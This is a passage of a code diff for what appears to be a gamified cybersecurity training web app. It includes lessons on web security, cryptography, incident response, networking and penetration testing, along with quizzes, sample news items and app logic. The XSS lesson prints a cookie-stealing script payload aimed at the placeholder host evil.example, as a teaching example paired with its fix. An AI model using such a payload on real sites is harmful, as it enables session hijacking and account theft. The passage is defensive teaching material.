+This returns ALL users!<br><br>
+<strong>Fix — Use parameterized queries:</strong><br>
+<code>query = "SELECT * FROM users WHERE name = ?"</code><br>
+The input is treated as data, not code.</div>
+
+<h3>Cross-Site Scripting (XSS)</h3>
+<p>XSS happens when untrusted content runs as code in a user's browser. Attackers can steal session cookies, redirect users, or deface pages.</p>
+<div class="example-box"><strong>Example:</strong> A comment field that doesn't sanitize input:<br>
+<code>&lt;script&gt;document.location='http://evil.example/steal?c='+document.cookie&lt;/script&gt;</code><br><br>
+<strong>Fix:</strong> Use context-appropriate output encoding. Never insert raw user input into HTML.</div>
+
+<h3>Broken Access Control</h3>
+<p>Users can perform actions or access data they shouldn't be able to. Hiding a button is NOT security — the server must verify permissions for every request.</p>
+
+<h3>CSRF (Cross-Site Request Forgery)</h3>
+<p>A malicious site tricks a logged-in user's browser into sending unwanted requests to another site.</p>
+
+<h3>Defense Checklist</h3>
+<ul>
+<li>Always validate and sanitize input on the server</li>
+<li>Use parameterized queries for all database operations</li>
+<li>Encode output appropriately for the context (HTML, JS, URL)</li>
+<li>Implement proper authentication and authorization checks server-side</li>
+<li>Use anti-CSRF tokens</li>
+<li>Keep all dependencies updated</li>
+<li>Never store secrets in client-side code</li>
+</ul>`,
+quiz:[
+{q:"What is the primary defense against SQL injection?",opts:["Renaming the database","Parameterized queries","Hiding error messages"],a:1,hint:"Separate data from code structure."},
+{q:"Does hiding a delete button from unauthorized users secure the endpoint?",opts:["Yes, if hidden well","No, the server must verify permissions","Yes, with CSS"],a:1,hint:"Client-side hiding is not security."}
+]}
+]},
+
+/* 8 */ {id:"crypto",icon:"🔐",title:"Cryptography Essentials",sub:"Encoding, hashing, and encryption",diff:"intermediate",xp:50,
+topics:[
+{title:"Understanding Cryptography",
+content:`<h3>Encoding vs Encryption vs Hashing</h3>
+<div class="table-wrap"><table>
+<tr><th>Concept</th><th>Reversible?</th><th>Key needed?</th><th>Purpose</th></tr>
+<tr><td><strong>Encoding</strong></td><td>Yes (easily)</td><td>No</td><td>Data format conversion (Base64, URL encoding)</td></tr>
+<tr><td><strong>Encryption</strong></td><td>Yes (with key)</td><td>Yes</td><td>Protecting confidentiality</td></tr>
+<tr><td><strong>Hashing</strong></td><td>No (one-way)</td><td>No</td><td>Verification, integrity checking</td></tr>
+</table></div>
+
+<div class="info-box danger"><strong>⚠️ Base64 is NOT encryption!</strong> Anyone can decode Base64. Never use encoding to "protect" sensitive data.</div>
+
+<h3>Password Storage</h3>
+<p>Passwords should be stored using a purpose-built slow hashing function with a unique salt:</p>
+<ul>
+<li><strong>Argon2id</strong> — Modern, recommended</li>
+<li><strong>bcrypt</strong> — Widely used, well-tested</li>
+<li><strong>scrypt</strong> — Memory-hard function</li>
+</ul>
+<p>A <strong>salt</strong> is a unique random value added to each password before hashing, preventing identical passwords from having identical hashes.</p>
+
+<h3>Symmetric vs Asymmetric Encryption</h3>
+<ul>
+<li><strong>Symmetric:</strong> Same key for encryption and decryption (AES). Fast, used for bulk data.</li>
+<li><strong>Asymmetric:</strong> Public key encrypts, private key decrypts (RSA, ECC). Used for key exchange and digital signatures.</li>
+</ul>
+
+<h3>Digital Signatures</h3>
+<p>Verify the origin and integrity of data using cryptographic keys. The sender signs with their private key; anyone can verify with the public key. Signatures prove authenticity, not confidentiality.</p>
+
+<div class="info-box warn"><strong>Golden Rule:</strong> Never invent your own cryptographic algorithms. Use established, maintained libraries and protocols.</div>`,
+quiz:[
+{q:"A developer stores passwords in Base64. Is this secure?",opts:["No, Base64 is easily reversible","Yes, it looks encrypted","Yes, if encoded twice"],a:0,hint:"Base64 is encoding, not encryption or hashing."},
+{q:"What is a salt in password storage?",opts:["A type of encryption","A unique value added before hashing to prevent duplicate hashes","The master password"],a:1,hint:"It adds uniqueness to each stored hash."}
+]}
+]},
+
+/* 9 */ {id:"incident",icon:"🚨",title:"Incident Response",sub:"Detect, contain, and recover from attacks",diff:"professional",xp:70,
+topics:[
+{title:"Incident Response Process",
+content:`<h3>The Incident Response Lifecycle</h3>
+<ol>
+<li><strong>Preparation:</strong> Build an incident response team, create playbooks, set up logging and monitoring, and test backup/recovery procedures.</li>
+<li><strong>Detection & Analysis:</strong> Identify what happened, which systems are affected, and what evidence exists. Use logs, alerts, and forensic tools.</li>
+<li><strong>Containment:</strong> Limit the damage. Short-term: isolate affected systems. Long-term: apply temporary fixes while planning remediation.</li>
+<li><strong>Eradication:</strong> Remove the threat — malware, unauthorized accounts, vulnerabilities that were exploited.</li>
+<li><strong>Recovery:</strong> Restore systems from trusted backups, patch vulnerabilities, rotate compromised credentials, and monitor for reinfection.</li>
+<li><strong>Lessons Learned:</strong> Conduct a post-incident review (blameless). Document what happened, what worked, what didn't, and how to improve.</li>
+</ol>
+
+<h3>If You Think You've Been Compromised</h3>
+<ul>
+<li>Stop using the affected device for sensitive activities</li>
+<li>Contact your organization's security team immediately</li>
+<li>Do NOT wipe the device — preserve evidence</li>
+<li>From a trusted device, change passwords for critical accounts</li>
+<li>Revoke suspicious sessions and review recovery settings</li>
+<li>Document everything: timestamps, screenshots, actions taken</li>
+</ul>
+
+<h3>Responsible Vulnerability Disclosure</h3>
+<div class="example-box">
+<strong>Report Template:</strong><br>
+• <strong>Title:</strong> Short, specific description<br>
+• <strong>Authorization:</strong> What policy/permission covers your test<br>
+• <strong>Affected Asset:</strong> Exact in-scope component<br>
+• <strong>Summary & Impact:</strong> What's wrong and why it matters<br>
+• <strong>Reproduction Steps:</strong> Safe, minimal steps using test accounts<br>
+• <strong>Evidence:</strong> Redacted screenshots and logs<br>
+• <strong>Suggested Fix:</strong> Practical mitigation<br>
+• <strong>Communication:</strong> Use the owner's private reporting channel
+</div>`,
+quiz:[
+{q:"What's the first thing to do if you suspect malware on a work laptop?",opts:["Delete random system files","Contact security team and follow guidance","Post about it online for help"],a:1,hint:"Coordinated response reduces harm."},
+{q:"Should you wipe a compromised device immediately?",opts:["Yes, to remove malware faster","No, preserve evidence for investigation","Yes, always start fresh"],a:1,hint:"Evidence helps understand the attack."}
+]}
+]},
+
+/* 10 */ {id:"advanced-net",icon:"🔬",title:"Advanced Networking",sub:"DNS, HTTPS, firewalls, and packet analysis",diff:"professional",xp:70,
+topics:[
+{title:"Advanced Network Concepts",
+content:`<h3>DNS (Domain Name System)</h3>
+<p>DNS translates human-readable domain names (like ihack.com) into IP addresses. It's like a phone book for the internet.</p>
+<ul>
+<li><strong>DNS Query Process:</strong> Browser → DNS Resolver → Root Server → TLD Server → Authoritative Server → IP Address returned</li>
+<li><strong>DNS Record Types:</strong> A (IPv4 address), AAAA (IPv6), MX (mail), CNAME (alias), NS (nameserver), TXT (text data)</li>
+<li><strong>DNS Security Risks:</strong> DNS spoofing/poisoning can redirect users to fake websites. DNSSEC adds cryptographic verification.</li>
+</ul>
+
+<h3>HTTPS and TLS</h3>
+<p>HTTPS uses TLS (Transport Layer Security) to encrypt data in transit between your browser and a server.</p>
+<ul>
+<li>TLS uses certificates to authenticate the server's identity</li>
+<li>Data is encrypted so eavesdroppers can't read it</li>
+<li><strong>HTTPS does NOT mean a site is trustworthy</strong> — phishing sites can use HTTPS too</li>
+</ul>
+
+<h3>Firewalls</h3>
+<p>Firewalls control network traffic based on rules:</p>
+<ul>
+<li><strong>Packet-filtering:</strong> Examines packet headers (source/destination IP, port, protocol)</li>
+<li><strong>Stateful:</strong> Tracks connection state for more intelligent filtering</li>
+<li><strong>Application-layer:</strong> Inspects packet content (WAF for web applications)</li>
+<li><strong>Next-gen (NGFW):</strong> Combines traditional firewall with IPS, application awareness, and threat intelligence</li>
+</ul>
+
+<h3>The OSI Model (7 Layers)</h3>
+<div class="table-wrap"><table>
+<tr><th>Layer</th><th>Name</th><th>Function</th><th>Protocols/Devices</th></tr>
+<tr><td>7</td><td>Application</td><td>User interface</td><td>HTTP, FTP, SMTP, DNS</td></tr>
+<tr><td>6</td><td>Presentation</td><td>Data formatting, encryption</td><td>SSL/TLS, JPEG, ASCII</td></tr>
+<tr><td>5</td><td>Session</td><td>Session management</td><td>NetBIOS, RPC</td></tr>
+<tr><td>4</td><td>Transport</td><td>Reliable delivery</td><td>TCP, UDP</td></tr>
+<tr><td>3</td><td>Network</td><td>Routing, addressing</td><td>IP, ICMP, Routers</td></tr>
+<tr><td>2</td><td>Data Link</td><td>Frame delivery</td><td>Ethernet, Switches, MAC</td></tr>
+<tr><td>1</td><td>Physical</td><td>Bit transmission</td><td>Cables, Hubs, Wi-Fi signals</td></tr>
+</table></div>
+<div class="info-box">Remember: <strong>"All People Seem To Need Data Processing"</strong> (Application → Physical) or <strong>"Please Do Not Throw Sausage Pizza Away"</strong> (Physical → Application).</div>`,
+quiz:[
+{q:"What does DNS translate domain names into?",opts:["MAC addresses","IP addresses","Encryption keys"],a:1,hint:"Like a phone book for the internet."},
+{q:"Does HTTPS prove a website is trustworthy?",opts:["Yes, only trusted sites get HTTPS","No, it only encrypts the connection","Yes, if the padlock is green"],a:1,hint:"Phishing sites can use HTTPS too."},
+{q:"Which OSI layer handles routing and IP addressing?",opts:["Layer 2 - Data Link","Layer 3 - Network","Layer 4 - Transport"],a:1,hint:"Routers operate at this layer."}
+]}
+]},
+
+/* 11 */ {id:"pentest",icon:"⚔️",title:"Penetration Testing Methodology",sub:"Professional pen-testing phases",diff:"professional",xp:80,
+topics:[
+{title:"Pen Testing Phases",
+content:`<h3>The 5 Phases of Penetration Testing</h3>
+<ol>
+<li><strong>Reconnaissance (Information Gathering):</strong>
+  <ul>
+    <li><em>Passive:</em> Gathering publicly available information (OSINT) — websites, social media, WHOIS records, DNS info</li>
+    <li><em>Active:</em> Directly interacting with the target (with authorization) — port scanning, service enumeration</li>
+  </ul>
+</li>
+<li><strong>Scanning & Enumeration:</strong>
+  <ul>
+    <li>Port scanning to identify open services</li>
+    <li>Version detection to identify software and versions</li>
+    <li>Vulnerability scanning to find known weaknesses</li>
+  </ul>
+</li>
+<li><strong>Exploitation:</strong>
+  <ul>
+    <li>Attempting to exploit identified vulnerabilities (within scope)</li>
+    <li>Goal: prove the vulnerability is real and demonstrate impact</li>
+    <li>Use minimum privilege needed — don't cause unnecessary damage</li>
+  </ul>
+</li>
+<li><strong>Post-Exploitation:</strong>
+  <ul>
+    <li>Document what was accessed</li>
+    <li>Assess the true impact of the vulnerability</li>
+    <li>Clean up any test artifacts</li>
+  </ul>
+</li>
+<li><strong>Reporting:</strong>
+  <ul>
+    <li>Executive summary for leadership</li>
+    <li>Technical details with reproduction steps</li>
+    <li>Risk ratings and prioritized recommendations</li>
+    <li>Remediation guidance</li>
+  </ul>
+</li>
+</ol>
+<div class="info-box warn"><strong>⚠️ Every phase requires authorization.</strong> Even passive reconnaissance should be done within the scope of your agreement. A professional pen test always starts and ends with documentation.</div>
+<h3>Essential Tools (for authorized testing only)</h3>
+<div class="table-wrap"><table>
+<tr><th>Tool</th><th>Purpose</th><th>Phase</th></tr>
+<tr><td>Nmap</td><td>Port scanning & service detection</td><td>Scanning</td></tr>
+<tr><td>Burp Suite</td><td>Web application testing</td><td>Scanning/Exploitation</td></tr>
+<tr><td>Wireshark</td><td>Network packet analysis</td><td>Reconnaissance/Analysis</td></tr>
+<tr><td>Metasploit</td><td>Exploitation framework</td><td>Exploitation</td></tr>
+<tr><td>John the Ripper</td><td>Password hash cracking</td><td>Post-Exploitation</td></tr>
+<tr><td>OWASP ZAP</td><td>Web vulnerability scanner</td><td>Scanning</td></tr>
+</table></div>`,
+quiz:[
+{q:"What is the first phase of a penetration test?",opts:["Exploitation","Reconnaissance","Reporting"],a:1,hint:"You gather information before attacking."},
+{q:"What tool is commonly used for port scanning?",opts:["Photoshop","Nmap","Microsoft Word"],a:1,hint:"It's the most famous network scanner."},
+{q:"What is the final deliverable of a pen test?",opts:["A social media post","A detailed report with findings and remediation","An invoice only"],a:1,hint:"Documentation is key to professional testing."}
+]}
+]}
+];
+
+const NEWS_POOL=[
+{title:"Major Hospital Chain Hit by Ransomware",body:"A ransomware attack forced multiple hospitals to divert emergency patients and revert to paper records. The attack exploited an unpatched VPN vulnerability.",tags:["Ransomware","Healthcare","VPN"],severity:"critical"},
+{title:"Zero-Day Vulnerability Found in Popular Browser",body:"Security researchers discovered a zero-day vulnerability allowing remote code execution. Users are urged to update their browsers immediately.",tags:["Zero-Day","Browser","RCE"],severity:"high"},
+{title:"Phishing Campaign Targets Remote Workers",body:"A sophisticated phishing campaign mimics IT department emails asking employees to 'verify their VPN credentials' through a convincing fake portal.",tags:["Phishing","Remote Work","Credentials"],severity:"high"},
+{title:"Cloud Misconfiguration Exposes Millions of Records",body:"A major company accidentally left an S3 storage bucket publicly accessible, exposing millions of customer records including emails and phone numbers.",tags:["Cloud","Misconfiguration","Data Leak"],severity:"critical"},
+{title:"New Malware Strain Targets IoT Devices",body:"Researchers identified a new botnet malware that specifically targets smart home devices with default credentials, recruiting them for DDoS attacks.",tags:["IoT","Botnet","DDoS"],severity:"medium"},
+{title:"Supply Chain Attack Compromises NPM Package",body:"A popular NPM package was compromised when an attacker gained access to a maintainer's account, injecting cryptocurrency-mining code into the package.",tags:["Supply Chain","NPM","Crypto Mining"],severity:"high"},
+{title:"Government Agency Warns of Spear-Phishing Wave",body:"A national cybersecurity agency issued an alert about targeted spear-phishing emails impersonating senior executives to authorize fraudulent wire transfers.",tags:["Spear-Phishing","Government","BEC"],severity:"high"},
+{title:"Critical SQL Injection Found in CMS Plugin",body:"A widely-used CMS plugin was found to contain a critical SQL injection vulnerability affecting over 500,000 websites. Patches have been released.",tags:["SQLi","CMS","Web Security"],severity:"critical"},
+{title:"Password Spraying Attack Hits Corporate Networks",body:"Attackers used password spraying techniques against corporate VPN endpoints, trying common passwords across thousands of accounts to avoid lockout detection.",tags:["Password Attack","VPN","Corporate"],severity:"medium"},
+{title:"AI-Generated Deepfake Used in Social Engineering",body:"Attackers used AI-generated voice deepfakes to impersonate a CEO during a phone call, successfully convincing an employee to transfer $243,000.",tags:["Deepfake","AI","Social Engineering"],severity:"high"},
+{title:"Critical Firmware Vulnerability in Network Routers",body:"A buffer overflow vulnerability in router firmware allows unauthenticated remote code execution. Multiple vendors are affected and patches are being released.",tags:["Firmware","Router","RCE"],severity:"critical"},
+{title:"Student Discovers XSS in University Portal",body:"A cybersecurity student responsibly disclosed an XSS vulnerability in their university's student portal. The university patched it within 48 hours and thanked the student.",tags:["XSS","Responsible Disclosure","Education"],severity:"medium"}
+];
+
+/* ─── BADGES ─── */
+const BADGE_DEFS=[
+{id:"welcome",name:"🌱 First Steps",desc:"Joined the academy",check:s=>true},
+{id:"quiz5",name:"🧠 Quiz Whiz",desc:"Answer 5 quizzes correctly",check:s=>Object.keys(s.solved).length>=5},
+{id:"quiz15",name:"⚡ Knowledge Storm",desc:"Answer 15 quizzes correctly",check:s=>Object.keys(s.solved).length>=15},
+{id:"quiz30",name:"🎓 Scholar",desc:"Answer 30 quizzes correctly",check:s=>Object.keys(s.solved).length>=30},
+{id:"lab",name:"🖥️ Lab Explorer",desc:"Run a terminal command",check:s=>s.termUsed},
+{id:"binary",name:"🔢 Binary Master",desc:"Convert an IP to binary",check:s=>s.binaryUsed},
+{id:"m3",name:"🌐 Network Navigator",desc:"Complete Networking Fundamentals",check:s=>missionDone(2,s)},
+{id:"m6",name:"🐉 Kali Commander",desc:"Complete Kali Linux Basics",check:s=>missionDone(6,s)},
+{id:"allbeg",name:"🏅 Beginner Champion",desc:"Complete all beginner missions",check:s=>MISSIONS.filter(m=>m.diff==='beginner').every((_,i)=>missionDone(MISSIONS.indexOf(_),s))},
+{id:"all",name:"🏆 Cyber Guardian",desc:"Complete all missions",check:s=>MISSIONS.every((_,i)=>missionDone(i,s))}
+];
+
+/* ═══════════════════════════════════════════
+   STATE MANAGEMENT
+   ═══════════════════════════════════════════ */
+const STORAGE_KEY='ihack-academy-v2';
+
+/* ─── CLIENT-SIDE SECURITY LOCK ───
+   Change SECURITY_LOCK_CODE to your own long, unique code.
+   This is a browser/UI lock only; a static HTML file cannot hide secrets from users who can inspect the source. */
+const SECURITY_LOCK_CODE='iHack@2026#Secure!';
+const SECURITY_AUTO_LOCK_MS=10*60*1000;
+let securityLocked=false;
+let securityAttempts=0;
+let securityTimer;
+let securityUnlocking=false;
+
+function lockAcademy(reason='manual'){
+  if(!S.user)return;
+  securityLocked=true;
+  securityUnlocking=false;
+  clearTimeout(securityTimer);
+  sessionStorage.removeItem('ihack-unlocked');
+  $('security-code').value='';
+  $('security-status').textContent=reason==='timeout'?'Locked after inactivity. Enter your code to continue.':'Academy locked. Enter your code to continue.';
+  $('security-status').className='security-status';
+  $('security-lock').classList.remove('hidden');
+  setTimeout(()=>$('security-code').focus(),50);
+}
+
+function unlockAcademy(){
+  securityLocked=false;
+  sessionStorage.setItem('ihack-unlocked','1');
+  $('security-lock').classList.add('hidden');
+  $('security-code').value='';
+  $('security-status').textContent='Unlocked';
+  $('security-status').className='security-status good';
+  resetSecurityTimer();
+}
+
+function resetSecurityTimer(){
+  clearTimeout(securityTimer);
+  if(!S.user||securityLocked)return;
+  securityTimer=setTimeout(()=>lockAcademy('timeout'),SECURITY_AUTO_LOCK_MS);
+}
+
+function setupSecurityLock(){
+  $('security-lock-form').addEventListener('submit',async e=>{
+    e.preventDefault();
+    if(securityUnlocking)return;
+    securityUnlocking=true;
+    const entered=$('security-code').value;
+    const status=$('security-status');
+    if(entered===SECURITY_LOCK_CODE){
+      securityAttempts=0;
+      unlockAcademy();
+      toast('🔓 Academy unlocked securely.');
+      securityUnlocking=false;
+      return;
+    }
+    securityAttempts++;
+    $('security-code').value='';
+    const delay=Math.min(8000,500*Math.pow(2,Math.min(securityAttempts-1,4)));
+    status.textContent=`Incorrect code. Try again in ${Math.ceil(delay/1000)}s.`;
+    status.className='security-status bad';
+    const input=$('security-code');
+    input.disabled=true;
+    setTimeout(()=>{input.disabled=false;input.focus();securityUnlocking=false},delay);
+  });
+
+  $('btn-lock').addEventListener('click',()=>lockAcademy());
+
+  ['click','keydown','pointermove','touchstart'].forEach(evt=>document.addEventListener(evt,()=>{
+    if(S.user&&!securityLocked)resetSecurityTimer();
+  },{passive:true}));
+}
+
+function freshState(){return{user:null,xp:0,solved:{},badges:['welcome'],actions:[],termUsed:false,binaryUsed:false,currentMission:0,currentTopic:0,diffBoost:0,newsDay:0}}
+let S=freshState();
+
+function save(){try{localStorage.setItem(STORAGE_KEY,JSON.stringify(S))}catch(e){}}
+function load(){try{const d=JSON.parse(localStorage.getItem(STORAGE_KEY));if(d&&d.user){S={...freshState(),...d};return true}}catch(e){}return false}
+
+function addXP(n,reason){S.xp+=n;logAction(`+${n} XP: ${reason}`);checkBadges();save();updateAllUI();toast(`+${n} XP — ${reason}`)}
+function logAction(msg){S.actions.unshift({t:Date.now(),msg});if(S.actions.length>50)S.actions.length=50;save()}
+
+function missionDone(idx,state){
+  const m=MISSIONS[idx];if(!m)return false;
+  const st=state||S;
+  return m.topics.every((t,ti)=>t.quiz.every((q,qi)=>st.solved[`${m.id}-${ti}-${qi}`]));
+}
+function completedCount(){return MISSIONS.filter((_,i)=>missionDone(i)).length}
+function getRank(){const c=completedCount();if(c>=12)return'Cyber Guardian';if(c>=9)return'Sentinel';if(c>=6)return'Defender';if(c>=3)return'Explorer';return'Recruit'}
+function getLevel(){return 1+Math.floor(S.xp/100)}
+function xpProgress(){return(S.xp%100)}
+
+function checkBadges(){
+  let earned=false;
+  BADGE_DEFS.forEach(b=>{if(!S.badges.includes(b.id)&&b.check(S)){S.badges.push(b.id);earned=true;toast(`🏆 Badge Unlocked: ${b.name}`)}});
+  if(earned)save();
+}
+
+function isMissionAccessible(idx){
+  const m=MISSIONS[idx];
+  if(!S.user)return false;
+  const lvl=S.user.level;
+  if(m.diff==='beginner')return true;
+  if(m.diff==='intermediate')return lvl==='intermediate'||lvl==='professional'||completedCount()>=3;
+  if(m.diff==='professional')return lvl==='professional'||completedCount()>=6;
+  return true;
+}
+
+/* ═══════════════════════════════════════════
+   NAVIGATION
+   ═══════════════════════════════════════════ */
+const PAGES=['home','learn','lab','news','profile'];
+function showPage(p){
+  if(!PAGES.includes(p))return;
+  ['auth',...PAGES].forEach(id=>{const el=$(`page-${id}`);if(el)el.classList.toggle('hidden',id!==p)});
+  document.querySelectorAll('#nav-links button').forEach(b=>b.classList.toggle('active',b.dataset.page===p));
+  window.scrollTo(0,0);
+  if(p==='home')renderHome();
+  if(p==='learn')renderLesson();
+  if(p==='news')renderNews();
+  if(p==='profile')renderProfile();
+}
+
+document.querySelectorAll('[data-page]').forEach(b=>b.addEventListener('click',()=>showPage(b.dataset.page)));
+
+/* ═══════════════════════════════════════════
+   AUTH
+   ═══════════════════════════════════════════ */
+let selectedLevel='beginner';
+document.querySelectorAll('.level-card').forEach(c=>{
+  c.addEventListener('click',()=>{
+    document.querySelectorAll('.level-card').forEach(x=>x.classList.remove('selected'));
+    c.classList.add('selected');
+    selectedLevel=c.dataset.level;
+  });
+});
+document.querySelector('.level-card[data-level="beginner"]').classList.add('selected');
+
+$('auth-form').addEventListener('submit',e=>{
+  e.preventDefault();
+  const name=$('auth-name').value.trim();
+  const age=parseInt($('auth-age').value);
+  if(!name||name.length<2){toast('Please enter a valid name',true);return}
+  if(!age||age<10||age>99){toast('Please enter a valid age (10-99)',true);return}
+  if(!$('auth-agree').checked){toast('Please agree to the terms',true);return}
+
+  S=freshState();
+  S.user={name,age,level:selectedLevel,joined:Date.now()};
+  S.xp=10; // Join bonus
+  S.badges=['welcome'];
+  logAction('Joined iHack Academy (+10 bonus XP)');
+  save();
+  enterApp();
+  toast(`Welcome, ${name}! You earned 10 bonus XP for joining! 🎉`);
+});
+
+function enterApp(){
+  $('page-auth').classList.add('hidden');
+  $('main-header').classList.remove('hidden');
+  $('main-footer').classList.remove('hidden');
+  $('bot-toggle').classList.remove('hidden');
+  $('nav-user').style.display='flex';
+  updateAllUI();
+  showPage('home');
+}
+
+$('btn-logout').addEventListener('click',()=>{
+  if(!confirm('Log out? Your progress is saved locally.'))return;
+  securityLocked=false;
+  clearTimeout(securityTimer);
+  sessionStorage.removeItem('ihack-unlocked');
+  $('main-header').classList.add('hidden');
+  $('main-footer').classList.add('hidden');
+  $('bot-toggle').classList.add('hidden');
+  $('bot-panel').classList.add('hidden');
+  $('nav-user').style.display='none';
+  PAGES.forEach(p=>$(`page-${p}`).classList.add('hidden'));
+  $('page-auth').classList.remove('hidden');
+  $('auth-form').reset();
+  document.querySelector('.level-card[data-level="beginner"]').click();
+});
+
+/* ═══════════════════════════════════════════
+   UPDATE ALL UI
+   ═══════════════════════════════════════════ */
+function updateAllUI(){
+  if(!S.user)return;
+  const lvl=getLevel();
+  $('nav-username').textContent=S.user.name;
+  $('nav-level').textContent=`Level ${lvl} · ${S.xp} XP`;
+  $('nav-xp-fill').style.width=xpProgress()+'%';
+}
+
+/* ═══════════════════════════════════════════
+   HOME PAGE
+   ═══════════════════════════════════════════ */
+function renderHome(){
+  if(!S.user)return;
+  const lvl=getLevel();
+  $('home-xp').textContent=S.xp;
+  $('home-level').textContent=lvl;
+  $('home-missions').textContent=completedCount()+'/'+MISSIONS.length;
+  $('home-rank').textContent=getRank();
+  $('level-indicator').textContent=`Your level: ${S.user.level.charAt(0).toUpperCase()+S.user.level.slice(1)} · Showing ${S.user.level==='professional'?'all':S.user.level==='intermediate'?'beginner + intermediate':'beginner'} content`;
+
+  // Mission map
+  $('mission-map').innerHTML=MISSIONS.map((m,i)=>{
+    const accessible=isMissionAccessible(i);
+    const done=missionDone(i);
+    const topicsDone=m.topics.reduce((c,t,ti)=>c+t.quiz.filter((q,qi)=>S.solved[`${m.id}-${ti}-${qi}`]).length,0);
+    const totalQ=m.topics.reduce((c,t)=>c+t.quiz.length,0);
+    const diffColor=m.diff==='beginner'?'green':m.diff==='intermediate'?'blue':'purple';
+    return`<div class="card mission-card" data-idx="${i}" style="cursor:${accessible?'pointer':'default'}">
+      <div class="mc-header">
+        <span class="mc-icon">${m.icon}</span>
+        <span class="chip chip-${diffColor}">${done?'✓ DONE':m.diff.toUpperCase()}</span>
+      </div>
+      <h3>${m.title}</h3>
+      <p>${m.sub}</p>
+      <div class="mc-footer">
+        <span class="text-muted" style="font-size:.8rem">${topicsDone}/${totalQ} quizzes · ${m.xp} XP</span>
+      </div>
+      <div class="progress-bar"><div class="progress-fill pf-green" style="width:${totalQ?topicsDone/totalQ*100:0}%"></div></div>
+      ${!accessible?`<div class="locked-overlay">🔒 Complete more missions to unlock</div>`:''}
+    </div>`;
+  }).join('');
+
+  document.querySelectorAll('.mission-card').forEach(c=>c.addEventListener('click',()=>{
+    const i=parseInt(c.dataset.idx);
+    if(isMissionAccessible(i)){S.currentMission=i;S.currentTopic=0;save();showPage('learn')}
+  }));
+
+  $('btn-start-learning').onclick=()=>{
+    const next=MISSIONS.findIndex((m,i)=>isMissionAccessible(i)&&!missionDone(i));
+    S.currentMission=next>=0?next:0;S.currentTopic=0;save();showPage('learn');
+  };
+
+  // Badges
+  $('home-badges').innerHTML=BADGE_DEFS.map(b=>{
+    const earned=S.badges.includes(b.id);
+    return`<div class="badge-item ${earned?'earned':''}">${earned?'✓':'🔒'} ${b.name} <span class="text-muted" style="font-size:.75rem">— ${b.desc}</span></div>`;
+  }).join('');
+}
+
+/* ═══════════════════════════════════════════
+   LEARN PAGE
+   ═══════════════════════════════════════════ */
+function renderLesson(){
+  const m=MISSIONS[S.currentMission];
+  if(!m)return;
+  const ti=S.currentTopic||0;
+
+  // Sidebar
+  $('lesson-sidebar').innerHTML=`<div class="card">${MISSIONS.map((mi,idx)=>{
+    if(!isMissionAccessible(idx))return`<button class="topic-btn" disabled style="opacity:.4">🔒 ${mi.title}</button>`;
+    const done=missionDone(idx);
+    return`<button class="topic-btn ${idx===S.currentMission?'active':''}" data-midx="${idx}">${done?'<span class="done-check">✓</span>':''}${mi.icon} ${mi.title}</button>`;
+  }).join('')}</div>`;
+
+  document.querySelectorAll('[data-midx]').forEach(b=>b.addEventListener('click',()=>{
+    S.currentMission=parseInt(b.dataset.midx);S.currentTopic=0;save();renderLesson();
+  }));
+
+  // Topic tabs
+  const topicTabs=m.topics.map((t,i)=>{
+    const tDone=t.quiz.every((q,qi)=>S.solved[`${m.id}-${i}-${qi}`]);
+    return`<button class="btn btn-sm ${i===ti?'btn-primary':'btn-secondary'}" data-tidx="${i}">${tDone?'✓ ':''}${t.title}</button>`;
+  }).join('');
+
+  const topic=m.topics[ti];
+  const quizHTML=topic.quiz.map((q,qi)=>{
+    const key=`${m.id}-${ti}-${qi}`;
+    const solved=S.solved[key];
+    return`<div class="quiz-section" id="quiz-${qi}">
+      <div class="quiz-q">${qi+1}. ${q.q}</div>
+      <div class="quiz-options">${q.opts.map((o,oi)=>
+        `<button class="quiz-opt ${solved!==undefined?(oi===q.a?'correct':(solved===oi?'wrong':'')):''}${oi===q.a&&solved!==undefined?' correct':''}" data-qi="${qi}" data-oi="${oi}" ${solved!==undefined?'disabled':''}>${solved!==undefined&&oi===q.a?'✓ ':''}${o}</button>`
+      ).join('')}</div>
+      <div id="qfb-${qi}" class="quiz-feedback ${solved!==undefined?(solved===q.a?'good':'bad'):'hidden'}" ${solved!==undefined?'':'hidden'}>
+        ${solved!==undefined?(solved===q.a?'✓ Correct!':'✗ Incorrect.'):''}
+      </div>
+    </div>`;
+  }).join('');
+
+  const diffLabel=m.diff.charAt(0).toUpperCase()+m.diff.slice(1);
+  const diffColor=m.diff==='beginner'?'green':m.diff==='intermediate'?'blue':'purple';
+
+  $('lesson-content').innerHTML=`
+    <div class="flex gap-sm mb-lg" style="flex-wrap:wrap">${topicTabs}</div>
+    <div class="card mb-lg">
+      <div class="flex justify-between items-center mb-md" style="flex-wrap:wrap;gap:10px">
+        <span class="chip chip-${diffColor}">${diffLabel} · Mission ${S.currentMission+1}/${MISSIONS.length}</span>
+        <span class="text-muted" style="font-size:.8rem">${m.xp} XP total</span>
+      </div>
+      <h2>${m.icon} ${topic.title}</h2>
+      ${topic.content}
+    </div>
+    <div class="card">
+      <h3>⚡ Knowledge Check</h3>
+      <p class="text-muted mb-md">Answer the quiz to earn XP. The bot will give you hints — not direct answers!</p>
+      ${quizHTML}
+      <div class="flex gap-sm mt-lg" style="flex-wrap:wrap">
+        ${S.currentMission>0?`<button class="btn btn-secondary" id="btn-prev-mission">← Previous Mission</button>`:''}
+        ${ti>0?`<button class="btn btn-secondary" id="btn-prev-topic">← Previous Topic</button>`:''}
+        ${ti<m.topics.length-1?`<button class="btn btn-primary" id="btn-next-topic">Next Topic →</button>`:''}
+        ${ti===m.topics.length-1&&S.currentMission<MISSIONS.length-1?`<button class="btn btn-primary" id="btn-next-mission">Next Mission →</button>`:''}
+      </div>
+    </div>`;
+
+  // Topic tab clicks
+  document.querySelectorAll('[data-tidx]').forEach(b=>b.addEventListener('click',()=>{
+    S.currentTopic=parseInt(b.dataset.tidx);save();renderLesson();
+  }));
+
+  // Quiz clicks
+  document.querySelectorAll('.quiz-opt:not(:disabled)').forEach(b=>b.addEventListener('click',()=>{
+    const qi=parseInt(b.dataset.qi);
+    const oi=parseInt(b.dataset.oi);
+    const q=topic.quiz[qi];
+    const key=`${m.id}-${ti}-${qi}`;
+    if(S.solved[key]!==undefined)return;
+
+    if(oi===q.a){
+      S.solved[key]=oi;save();
+      addXP(25,'Correct quiz answer');
+      renderLesson();
+    } else {
+      b.classList.add('wrong');b.disabled=true;
+      const fb=$(`qfb-${qi}`);
+      fb.className='quiz-feedback bad';
+      fb.hidden=false;
+      fb.innerHTML=`✗ Not quite. <strong>Hint:</strong> ${q.hint}`;
+    }
+  }));
+
+  // Navigation buttons
